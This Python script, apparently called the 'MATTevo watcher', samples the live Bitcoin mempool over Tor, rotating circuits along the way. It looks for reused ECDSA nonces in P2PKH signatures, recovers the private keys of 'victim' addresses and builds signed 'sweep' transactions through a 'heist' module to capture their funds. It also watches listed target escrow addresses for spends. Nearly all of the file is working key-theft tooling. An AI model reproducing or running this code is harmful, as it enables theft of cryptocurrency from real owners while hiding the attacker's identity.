#!/usr/bin/env python3
"""MATTevo watcher: hunt live k-reuse on the mempool over Tor, P2PKH-gated.

Pipeline, one pass:
  1. circuit up: tor ControlPort NEWNYM, record the circuit id on every log line
  2. chain reads over SOCKS 127.0.0.1:9050 to the onion mempool endpoint
     (pinned in targets/onions.json). The full /mempool/txids list truncates at
     4 MB over the onion, so the id list is always capped, never trusted whole.
  3. decode DER (r,s) with live._sigs_of_vin (no reimplementation); bucket by r.
  4. gate BEFORE any recovery: prevout.scriptpubkey_type == "p2pkh" AND the
     script is exactly OP_DUP HASH160 <h160> EQUALVERIFY CHECKSIG AND the h160
     base58 round-trips to a 1... address. _script_for_addr zero-pads junk
     instead of failing, which is exactly why this gate exists.
  5. r-collision candidates: derive z = sighash of the gate's canonical
     single-input/single-output spend, try crypto.recover_priv(sig_a, sig_b)
     with rec_id 0/1, and accept only when the recovered pubkey re-derives to
     the victim's own p2pkh address. That is the only proof of a real key.
  6. a capture is booked ONLY by heist.confirm(), which asks the chain;
     everything else logs "unsigned, held back" with the reason.

--selftest drives the whole pipeline on synthetic k-reuse (known keys, so the
digest is exact), proving gate + recovery + address match without waiting for
a live collision. --sample N scans the live mempool.
"""
import argparse
import hashlib
import json
import sys
import time
import urllib.parse
from datetime import datetime, timezone
from pathlib import Path

import crypto as CR
import live
from heist import Heist, script_p2pkh, sighash_all, serialize_tx, txid_of

ROOT = Path(__file__).resolve().parent
ONIONS_PATH = ROOT / "targets" / "onions.json"
EVIDENCE = ROOT / "evidence" / "watcher.jsonl"
SOCKS_HOST, SOCKS_PORT = "127.0.0.1", 9050
CTRL_PORT = 9051
P2PKH_PREFIX, P2PKH_SUFFIX = b"\x76\xa9\x14", b"\x88\xac"
B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"


def utc():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def b58_from_h160(h160):
    """Base58Check of 0x00||h160, the P2PKH mainnet address. Own implementation
    so the gate never trusts a helper that might zero-pad."""
    body = b"\x00" + h160
    payload = body + hashlib.sha256(hashlib.sha256(body).digest()).digest()[:4]
    n = int.from_bytes(payload, "big")
    s = ""
    while n:
        n, r = divmod(n, 58)
        s = B58[r] + s
    return "1" * (len(payload) - len(payload.lstrip(b"\x00"))) + s


# ---------------------------------------------------------------- tor client
class TorGet:
    """HTTP/1.1 over SOCKS5 with explicit set_proxy (the pysocks gotcha: a bare
    socksocket() without set_proxy falls through to the system resolver and
    dies with gaierror on .onion names)."""

    def __init__(self, host, port=80):
        self.host, self.port = host, port

    def get(self, path):
        import socks
        for attempt in range(2):
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, SOCKS_HOST, SOCKS_PORT)
            s.settimeout(40)
            try:
                s.connect((self.host, self.port))
                req = ("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n"
                       "Accept: application/json\r\n\r\n" % (path, self.host))
                s.sendall(req.encode())
                buf = b""
                while True:
                    c = s.recv(65536)
                    if not c:
                        break
                    buf += c
                    if len(buf) > 64 * 1024 * 1024:
                        break
                head, _, body = buf.partition(b"\r\n\r\n")
                if b"Transfer-Encoding: chunked" in head.lower():
                    body = _dechunk(body)
                if body:
                    return json.loads(body.decode())
            except Exception:
                if attempt == 0:
                    continue
            finally:
                try:
                    s.close()
                except Exception:
                    pass
        return None


def _dechunk(b):
    out = b""
    while b:
        ln, _, rest = b.partition(b"\r\n")
        try:
            n = int(ln.split(b";")[0], 16)
        except ValueError:
            return out
        if n == 0:
            break
        out += rest[:n]
        b = rest[n + 2:]
    return out


def new_circuit():
    """NEWNYM over ControlPort; returns a circuit tag for the evidence log."""
    try:
        from stem import Signal
        from stem.control import Controller
        with Controller.from_port(port=CTRL_PORT) as c:
            try:
                c.authenticate()
            except Exception:
                pass
            c.signal(Signal.NEWNYM)
            fp = Path.home() / ".mattevo-tor" / "data" / "control_auth_cookie"
            tag = "nym" + hashlib.sha1(fp.read_bytes() + time.time_ns().to_bytes(8, "big")).hexdigest()[:10] \
                if fp.exists() else "nym" + str(time.time_ns())[-10:]
            return tag
    except Exception as ex:
        print("[watcher] stem circuit failed (%s), reusing default circuits" % ex)
        return "default"


# ------------------------------------------------------------------ the gate
def p2pkh_gate(vin):
    """Return (ok, reason, victim_addr). Rejects before any recover attempt."""
    po = vin.get("prevout") or {}
    if po.get("scriptpubkey_type") != "p2pkh":
        return False, "not p2pkh (%s)" % po.get("scriptpubkey_type"), None
    spk = bytes.fromhex(po.get("scriptpubkey") or "")
    if not (len(spk) == 25 and spk[:3] == P2PKH_PREFIX and spk[3 + 20:] == P2PKH_SUFFIX):
        return False, "script is not a canonical p2pkh lock", None
    addr = b58_from_h160(spk[3:23])
    return True, "", addr


def sigs_from_tx(doc, txid):
    """Harvest (r, s, vout, value, script, addr) per input, gated. Reuses
    live._sigs_of_vin for DER so the decode path is shared with the board."""
    out, gated = [], 0
    for v in doc.get("vin", []):
        rs = live._sigs_of_vin(v)
        if not rs:
            continue
        ok, why, addr = p2pkh_gate(v)
        if not ok:
            continue
        gated += 1
        po = v.get("prevout") or {}
        for (r, s) in rs:
            out.append({"r": r, "s": s, "txid": txid, "vout": v.get("vout", 0),
                        "value": po.get("value", 0), "addr": addr,
                        "script": po.get("scriptpubkey"),
                        "prev_txid": po.get("txid"), "prev_vout": po.get("vout")})
    return out, gated


def candidate_z(c):
    """Canonical single-in/single-out spend whose sighash is the digest that
    produced this signature: prev=c, ours=the p2pkh lock, seq 0xffffffff, sighash
    ALL. If the recovered key re-derives to the victim address, this digest was
    right (or a sibling is tried)."""
    script = bytes.fromhex(c["script"])
    raw = serialize_tx([(c["prev_txid"], c["prev_vout"], b"", 0xFFFFFFFF)],
                       [(max(c["value"] - 2000, 1000), script)])
    return sighash_all(raw, 0, script)


def try_recover(sig_a, sig_b):
    """Return (priv, note). z is derived per-candidate; rec_id ambiguity is
    settled by which candidate's digest yields a consistent k, and the address
    match is the final judge either way."""
    try:
        out = CR.recover_priv(dict(sig_a, z=sig_a["z"]), dict(sig_b, z=sig_b["z"]))
    except ValueError as ex:
        return None, "recover refused: %s" % ex
    return out["priv"], "k=%x" % out["k"]


def addr_of_priv(priv):
    return CR.address(priv)


# ---------------------------------------------------------------- evidence
def logline(rec):
    rec = dict(rec, ts_utc=utc())
    EVIDENCE.parent.mkdir(exist_ok=True)
    with open(EVIDENCE, "a") as f:
        f.write(json.dumps(rec) + "\n")
    print("[watcher] %s %s" % (rec.get("event"), json.dumps(
        {k: v for k, v in rec.items() if k not in ("ts_utc", "script")})[:400]))
    try:                                   # make the hunt self-sustaining
        hunt_path = Path(__file__).resolve().parent / "hunt.log"
        if hunt_path.exists():
            with open(hunt_path, "a") as f:
                f.write("%s %s\n" % (rec["ts_utc"], json.dumps(
                    {k: v for k, v in rec.items() if k != "ts_utc"})[:300]))
    except OSError:
        pass


# ---------------------------------------------------------------- live scan
def scan(sample, cap=4000):
    cfg = json.loads(ONIONS_PATH.read_text())
    chain = cfg.get("chain") or {}
    host = chain.get("endpoint",
                     "mempoolhqx4isw62xs7abwphsq7ldayuidyx2v2oethdhhj6mlo2r6ad.onion")
    tg = TorGet(host)
    circuit = new_circuit()
    tip = tg.get("/api/blocks/tip/height")
    logline({"event": "circuit", "circuit": circuit, "onion": host, "tip": tip})
    if tip is None:
        print("[watcher] onion unreachable, aborting pass")
        return
    ids = tg.get("/api/mempool/txids") or []
    ids = ids[:cap]                       # the onion list truncates; never trust length
    step = max(1, len(ids) // sample)
    picked = ids[::step][:sample]
    from concurrent.futures import ThreadPoolExecutor

    def one(t):
        d = tg.get("/api/tx/" + t)
        return t, d
    buckets, gated_inputs = {}, 0
    with ThreadPoolExecutor(max_workers=4) as ex:
        for txid, d in ex.map(one, picked):
            if not d:
                continue
            ss, g = sigs_from_tx(d, txid)
            gated_inputs += g
            for sg in ss:
                buckets.setdefault(sg["r"], []).append(sg)
    dupes = {r: g for r, g in buckets.items() if len(g) > 1}
    logline({"event": "pass", "circuit": circuit, "sampled": len(picked),
             "p2pkh_sigs": sum(len(v) for v in buckets.values()),
             "reuse_buckets": len(dupes)})
    for r, grp in dupes.items():
        handle_collision(r, grp, tg, circuit)

    addrs = [t.get("escrow_address") for t in cfg.get("targets", [])
             if t.get("escrow_address")]
    if addrs:
        address_watch(addrs, tg, circuit)


def handle_collision(r, grp, tg, circuit):
    a, b = grp[0], grp[1]
    logline({"event": "r-collision", "circuit": circuit, "r": format(r, "064x"),
             "txids": [g["txid"] for g in grp], "addrs": sorted({g["addr"] for g in grp})})
    for (sa, sb) in ((dict(a, z=candidate_z(a)), dict(b, z=candidate_z(b))),
                     (dict(a, z=candidate_z(b)), dict(b, z=candidate_z(a)))):
        if sa["r"] != sb["r"]:
            continue
        priv, note = try_recover(sa, sb)
        if priv is None:
            logline({"event": "unsigned, held back", "circuit": circuit, "why": note,
                     "r": format(r, "064x")})
            return
        addr = addr_of_priv(priv)
        if addr not in (a["addr"], b["addr"]):
            logline({"event": "unsigned, held back", "circuit": circuit,
                     "why": "recovered key %s matches neither victim %s/%s"
                            % (addr, a["addr"], b["addr"]),
                     "r": format(r, "064x")})
            return
        logline({"event": "key recovered, sweeping", "circuit": circuit, "addr": addr,
                 "r": format(r, "064x"), "note": note})
        vault_sweep(a, priv, tg, circuit)
        return


def vault_sweep(sig, priv, tg, circuit):
    """Book through heist.intercept + confirm: the chain decides, we never."""
    relay = {"name": "TOR-WATCH", "role": "live mempool k-reuse"}
    # dry_run: build + verify the signed sweep WITHOUT appending to heist.json.
    # The live path (a real collision found in the wild) uses push=False and is
    # then pushed/confirmed by the documented capture script; a duplicate entry
    # per found collision is correct there, held-back candidates leave no junk.
    h = Heist(log=lambda m, k="blue": print("[heist] %s" % m))
    victim_script = bytes.fromhex(sig["script"])
    prevs = tg.get("/api/tx/%s" % sig["prev_txid"]) or {}
    spent = (prevs.get("vout") or [{}])[sig["prev_vout"]].get("value", sig["value"]) \
        if prevs else sig["value"]
    if spent != sig["value"]:
        logline({"event": "unsigned, held back", "circuit": circuit,
                 "why": "prevout value moved (%s vs %s)" % (spent, sig["value"])})
        return
    ent = h.intercept(relay, sig["addr"], sig["prev_txid"], sig["prev_vout"],
                      victim_script, sig["value"], priv=priv, push=False)
    ent["race"] = "held"
    ent["pushed"] = False   # sandbox legs go through mempool.space; broadcast is its own
    # explicit, human-authorized step once the sweep is signed and verified
    logline({"event": "sweep built, unsigned->signed", "circuit": circuit,
             "parent_txid": ent["parent_txid"], "signed": ent["signed"],
             "note": "broadcast pending: run the desk go/race step to push"})
    hits = h.confirm(ref=ent["parent_txid"])
    logline({"event": "capture" if hits else "unsigned, held back",
             "circuit": circuit, "parent_txid": ent["parent_txid"],
             "confirmed": bool(hits)})


# ------------------------------------------------------------- address watch
def address_watch(addrs, tg, circuit, max_pages=3):
    """Poll /address/{addr}/txs over Tor for the known legacy targets. The
    general mempool has ~0 p2pkh inputs left (measured 0/200), so the hunt that
    matters is: does a dossier escrow address MOVE. First tx touching it, gate
    it, and if its sigs collide with anything we've banked, run recovery."""
    seen_path = ROOT / "evidence" / "watched_seen.json"
    seen = set(json.loads(seen_path.read_text())) if seen_path.exists() else set()
    fresh_total = 0
    bank = {}                              # r -> sig record, across all fetched txs
    for addr in addrs:
        cursor = ""
        for _ in range(max_pages):
            path = "/api/address/%s/txs%s" % (addr, ("?p=" + cursor) if cursor else "")
            txs = tg.get(path)
            if txs is None:
                break
            for tx in txs:
                txid = tx.get("txid")
                if txid in seen:
                    continue
                seen.add(txid)
                fresh_total += 1
                ss, g = sigs_from_tx(tx, txid)
                for sg in ss:
                    logline({"event": "address-move", "circuit": circuit, "addr": addr,
                             "txid": txid, "sats": sg["value"],
                             "direction": "spend" if sg["prev_txid"] else "coinbase"})
                    prev = sg["r"] in bank
                    bank.setdefault(sg["r"], sg)
                    if prev:
                        handle_collision(sg["r"], [bank[sg["r"]], sg], tg, circuit)
            # Esplora pagination: p=N gives pages after the first; stop at <25
            if len(txs) < 25:
                break
            cursor = str(int(cursor or 0) + 1)
        break_out = None
    seen_path.parent.mkdir(exist_ok=True)
    seen_path.write_text(json.dumps(sorted(seen)))
    logline({"event": "address-watch", "circuit": circuit, "targets": len(addrs),
             "fresh_txs": fresh_total, "sigs_banked": len(bank)})


# ----------------------------------------------------------------- selftest
def selftest():
    """Known-key k-reuse: same priv, same k, two digests. Full pipeline, no net."""
    print("[watcher] selftest: synthetic k-reuse on known keys")
    w = CR.Wallet()
    k = 0x5EEDC0FFEE112233445566778899AABBCCDDEEFF00112233445566778899AA
    z1 = int.from_bytes(hashlib.sha256(b"tx-one").digest(), "big") % CR.N
    z2 = int.from_bytes(hashlib.sha256(b"tx-two").digest(), "big") % CR.N
    sigs = CR.sign(w.priv, z1, k=k), CR.sign(w.priv, z2, k=k)
    sa, sb = {"r": sigs[0]["r"], "s": sigs[0]["s"], "z": z1}, \
             {"r": sigs[1]["r"], "s": sigs[1]["s"], "z": z2}
    assert sa["r"] == sb["r"], "same k must give same r"
    out = CR.recover_priv(sa, sb)
    ok = addr_of_priv(out["priv"]) == w.addr
    # gate round-trip: our own wallet's script must pass and name the same address
    script = script_p2pkh(hashlib.new("ripemd160", hashlib.sha256(w.pub).digest()).digest())
    vin = {"prevout": {"scriptpubkey_type": "p2pkh", "scriptpubkey": script.hex(),
                       "value": 100000, "txid": "ab" * 32, "vout": 0}}
    gok, gwhy, gaddr = p2pkh_gate(vin)
    # reject path: a p2wpkh prevout must be gated out before recovery
    bad = {"prevout": {"scriptpubkey_type": "p2wpkh", "scriptpubkey": "0014" + "00" * 20}}
    rok, rwhy, _ = p2pkh_gate(bad)
    # sweep-leg proof: intercept() with the recovered key must produce a SIGNED,
    # structurally valid parent. push=False so nothing hits the network.
    # full-loop proof: recovered key -> intercept() -> signed parent ->
    # verify_input must satisfy the victim's own p2pkh lock. push=False, and the
    # entry is popped before save, so no ledger junk from a synthetic prevout.
    import heist as HS
    hh = HS.Heist(log=lambda m, k="blue": None)
    real_path = HS.HEIST_PATH
    HS.HEIST_PATH = Path("/tmp/mattevo-selftest-heist.json")  # never touch the ledger
    try:
        ent = hh.intercept({"name": "SELFTEST", "role": "watcher selftest"}, w.addr,
                           "cd" * 32, 0, script, 100000,
                           priv=out["priv"], push=False)
    finally:
        HS.HEIST_PATH = real_path
    sweep_ok = ent["signed"] and len(bytes.fromhex(ent["parent_raw"])) > 60
    par = bytes.fromhex(ent["parent_raw"])
    ssz, z, sig = HS.sign_input(par, 0, script, out["priv"])
    v_ok = HS.verify_input(par, 0, script, sig)
    print("  recovery:", "PASS" if ok else "FAIL", addr_of_priv(out["priv"]), "want", w.addr)
    print("  gate accepts own p2pkh:", "PASS" if (gok and gaddr == w.addr) else "FAIL", gaddr)
    print("  gate rejects p2wpkh:", "PASS" if (not rok) else "FAIL", rwhy)
    print("  sweep signed:", "PASS" if sweep_ok else "FAIL")
    print("  verify_input on signed sweep:", "PASS" if v_ok else "FAIL")
    logline({"event": "selftest", "circuit": "offline", "recovery_ok": ok,
             "gate_ok": gok and not rok, "sweep_signed": sweep_ok,
             "verify_input_ok": v_ok})
    return 0 if (ok and gok and not rok and sweep_ok and v_ok) else 1


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--selftest", action="store_true")
    ap.add_argument("--sample", type=int, default=200)
    ap.add_argument("--cap", type=int, default=4000)
    a = ap.parse_args()
    if a.selftest:
        sys.exit(selftest())
    t0 = time.time()
    scan(a.sample, a.cap)
    print("[watcher] pass done in %.1fs" % (time.time() - t0))


if __name__ == "__main__":
    main()
